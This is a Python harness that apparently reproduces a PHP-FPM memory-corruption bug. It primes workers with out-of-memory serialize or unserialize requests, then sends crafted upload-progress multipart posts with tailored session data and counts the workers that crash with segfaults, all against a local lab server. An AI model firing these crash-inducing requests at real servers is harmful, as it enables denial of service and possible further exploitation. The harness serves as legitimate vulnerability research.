#!/usr/bin/env python3
"""Multi-worker FPM priming matrix driver.

Decode: producer_oom.php (OOM in unserialize) + consumer.php upload-progress
        multipart with session file p|s:5:"hello";
Encode: producer_ser_oom.php (OOM in serialize) + consumer.php multipart with
        session file p|a:2:{i:0;s:5:"hello";i:1;R:2;}

Producer batch -> FPM access log gives worker PIDs.
Consumer batch -> survivors are in FPM access log; crashes are in FPM error log
                  (child <pid> exited on signal 11).
"""
import argparse, http.client, json, os, re, socket, sys, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed

RUN = "/tmp/opencode/research/fpm_bg_20261023T021053Z"
SESSION_DIR = os.path.join(RUN, "lab/sessions_matrix")
BOUNDARY = "----matrixBoundary7MA4YWxkTrZu0gW"

DECODE_SESSION = b'p|s:5:"hello";'
ENCODE_SESSION = b'p|a:2:{i:0;s:5:"hello";i:1;R:2;}'


def build_consumer_body(sid, key, pad_size=0, pads=1):
    parts = []
    def field(name, value):
        parts.append(("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n" % (BOUNDARY, name)).encode())
        parts.append(value if isinstance(value, bytes) else value.encode())
        parts.append(b"\r\n")
    field("PHPSESSID", sid)
    if pad_size > 0:
        for _ in range(pads):
            field("pad", b"P" * pad_size)
    field("PHP_SESSION_UPLOAD_PROGRESS", key)
    parts.append(("--%s\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\nContent-Type: text/plain\r\n\r\n" % BOUNDARY).encode())
    parts.append(b"A")
    parts.append(("\r\n--%s--\r\n" % BOUNDARY).encode())
    return b"".join(parts)


def http_get(host, port, path, timeout=60):
    t0 = time.time()
    conn = None
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        conn.request("GET", path)
        r = conn.getresponse()
        body = r.read()
        return {"status": r.status, "len": len(body), "body": body[:300].decode("latin1", "replace"), "dt": round(time.time() - t0, 3)}
    except Exception as e:
        return {"status": None, "error": "%s: %s" % (type(e).__name__, e), "dt": round(time.time() - t0, 3)}
    finally:
        if conn is not None:
            try: conn.close()
            except Exception: pass


def http_post_multipart(host, port, path, body, timeout=60):
    t0 = time.time()
    conn = None
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        conn.request("POST", path, body=body, headers={
            "Content-Type": "multipart/form-data; boundary=" + BOUNDARY,
            "Content-Length": str(len(body)),
            "Connection": "close",
        })
        r = conn.getresponse()
        resp = r.read()
        return {"status": r.status, "len": len(resp), "body": resp[:300].decode("latin1", "replace"), "dt": round(time.time() - t0, 3)}
    except Exception as e:
        return {"status": None, "error": "%s: %s" % (type(e).__name__, e), "dt": round(time.time() - t0, 3)}
    finally:
        if conn is not None:
            try: conn.close()
            except Exception: pass


def read_new(path, offset):
    try:
        with open(path, "rb") as f:
            f.seek(offset)
            return f.read().decode("latin1", "replace")
    except FileNotFoundError:
        return ""


def parse_fpm_access(text):
    """"%p %R %m %s %q %f" -> list of dicts."""
    out = []
    for line in text.splitlines():
        parts = line.split(" ", 5)
        if len(parts) < 6:
            continue
        try:
            pid = int(parts[0])
        except ValueError:
            continue
        out.append({"pid": pid, "remote": parts[1], "method": parts[2], "status": parts[3],
                    "query": parts[4], "script": parts[5], "line": line})
    return out


def parse_sig11(text):
    out = []
    for m in re.finditer(r"child (\d+) exited on signal 11", text):
        out.append(int(m.group(1)))
    return out


def parse_nginx_access(text):
    out = []
    for line in text.splitlines():
        m = re.search(r'"(GET|POST) ([^"]*?) HTTP/[^"]*" (\d{3}) ', line)
        if m:
            out.append({"method": m.group(1), "path": m.group(2), "status": int(m.group(3)), "line": line})
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=29511)
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--type", choices=["decode", "encode"], required=True)
    ap.add_argument("--producers", type=int, default=5)
    ap.add_argument("--consumers", type=int, default=0)
    ap.add_argument("--tag", required=True)
    ap.add_argument("--n", type=int, default=0)
    ap.add_argument("--outdir", required=True)
    ap.add_argument("--fpm-access", default=RUN + "/lab/logs/fpm-matrix-access.log")
    ap.add_argument("--fpm-error", default=RUN + "/lab/logs/fpm-matrix-error.log")
    ap.add_argument("--nginx-access", default=RUN + "/lab/logs/nginx-matrix-access.log")
    ap.add_argument("--pad-size", type=int, default=0)
    ap.add_argument("--pads", type=int, default=1)
    args = ap.parse_args()
    if args.consumers == 0:
        args.consumers = args.producers
    if args.n == 0:
        args.n = 8000000 if args.type == "decode" else 300000

    os.makedirs(args.outdir, exist_ok=True)
    os.makedirs(SESSION_DIR, exist_ok=True)
    offsets = {}
    for p in (args.fpm_access, args.fpm_error, args.nginx_access):
        try: offsets[p] = os.path.getsize(p)
        except FileNotFoundError: offsets[p] = 0

    session = DECODE_SESSION if args.type == "decode" else ENCODE_SESSION
    producer_script = "producer_oom.php" if args.type == "decode" else "producer_ser_oom.php"

    # Prepare consumer sessions first (before any producer clears/uses state).
    sids = []
    safe_tag = re.sub(r"[^A-Za-z0-9,-]", "", args.tag)
    for i in range(args.consumers):
        sid = "m%s-%d" % (safe_tag, i)
        sids.append(sid)
        with open(os.path.join(SESSION_DIR, "sess_" + sid), "wb") as f:
            f.write(session)

    result = {"tag": args.tag, "type": args.type, "port": args.port,
              "producers": args.producers, "consumers": args.consumers, "n": args.n,
              "producer_script": producer_script, "sids": sids}

    # ---- producer batch ----
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=args.producers) as ex:
        futs = {}
        for i in range(args.producers):
            path = "/%s?n=%d&tag=%sp%d" % (producer_script, args.n, args.tag, i)
            futs[ex.submit(http_get, args.host, args.port, path)] = i
        prod = []
        for f in as_completed(futs):
            i = futs[f]
            r = f.result()
            r["i"] = i
            prod.append(r)
    prod.sort(key=lambda x: x["i"])
    result["producer_responses"] = prod
    result["producer_wall"] = round(time.time() - t0, 3)
    time.sleep(0.4)

    fpm_access = read_new(args.fpm_access, offsets[args.fpm_access])
    open(os.path.join(args.outdir, "fpm_access_producers.txt"), "w").write(fpm_access)
    lines = parse_fpm_access(fpm_access)
    ptag = re.compile(r"tag=%sp(\d+)" % re.escape(args.tag))
    prows = []
    for ln in lines:
        m = ptag.search(ln["query"])
        if m and producer_script in ln["script"]:
            ln["i"] = int(m.group(1))
            prows.append(ln)
    primed = sorted(set(x["pid"] for x in prows))
    result["producer_rows"] = prows
    result["primed_pids"] = primed
    result["primed_distinct"] = len(primed)

    # ---- consumer batch ----
    t1 = time.time()
    with ThreadPoolExecutor(max_workers=args.consumers) as ex:
        futs = {}
        for i in range(args.consumers):
            body = build_consumer_body(sids[i], "key_%s_c%d" % (args.tag, i), args.pad_size, args.pads)
            path = "/consumer.php?tag=%sc%d" % (args.tag, i)
            futs[ex.submit(http_post_multipart, args.host, args.port, path, body)] = i
        cons = []
        for f in as_completed(futs):
            i = futs[f]
            r = f.result()
            r["i"] = i
            r["sid"] = sids[i]
            cons.append(r)
    cons.sort(key=lambda x: x["i"])
    result["consumer_responses"] = cons
    result["consumer_wall"] = round(time.time() - t1, 3)
    time.sleep(0.6)

    fpm_access2 = read_new(args.fpm_access, offsets[args.fpm_access])
    fpm_error2 = read_new(args.fpm_error, offsets[args.fpm_error])
    nginx2 = read_new(args.nginx_access, offsets[args.nginx_access])
    open(os.path.join(args.outdir, "fpm_access_all.txt"), "w").write(fpm_access2)
    open(os.path.join(args.outdir, "fpm_error_new.txt"), "w").write(fpm_error2)
    open(os.path.join(args.outdir, "nginx_access_new.txt"), "w").write(nginx2)

    allrows = parse_fpm_access(fpm_access2)
    ctag = re.compile(r"tag=%sc(\d+)" % re.escape(args.tag))
    crows = []
    for ln in allrows:
        m = ctag.search(ln["query"])
        if m and "consumer.php" in ln["script"]:
            ln["i"] = int(m.group(1))
            crows.append(ln)
    crashed = sorted(set(parse_sig11(fpm_error2)))
    nginx_rows = parse_nginx_access(nginx2)
    nginx_cons = [x for x in nginx_rows if ("tag=%sc" % args.tag) in x["path"]]
    nginx_502 = [x for x in nginx_cons if x["status"] == 502]
    nginx_200 = [x for x in nginx_cons if x["status"] == 200]

    result["consumer_rows"] = crows
    result["crashed_pids"] = crashed
    result["crashed_on_primed"] = sorted(set(crashed) & set(primed))
    result["crashed_not_primed"] = sorted(set(crashed) - set(primed))
    result["nginx_consumer_rows"] = nginx_cons
    result["nginx_502"] = len(nginx_502)
    result["nginx_200"] = len(nginx_200)
    result["consumer_survivor_pids"] = sorted(set(int(x["pid"]) for x in crows if x["status"] == "200"))
    result["survivors_on_primed"] = sorted(set(result["consumer_survivor_pids"]) & set(primed))
    result["verdict"] = {
        "all_primed_crashed": bool(result["crashed_on_primed"]) and len(result["crashed_on_primed"]) == len(primed),
        "any_cross_worker_crash": bool(result["crashed_not_primed"]),
        "missing_primed_crashes": sorted(set(primed) - set(crashed)),
    }

    with open(os.path.join(args.outdir, "result.json"), "w") as f:
        json.dump(result, f, indent=2)
    print(json.dumps({k: result[k] for k in (
        "tag", "type", "producers", "consumers", "n",
        "primed_pids", "primed_distinct", "crashed_pids", "crashed_on_primed",
        "crashed_not_primed", "nginx_502", "nginx_200",
        "consumer_survivor_pids", "survivors_on_primed", "verdict")}, indent=2))


if __name__ == "__main__":
    main()
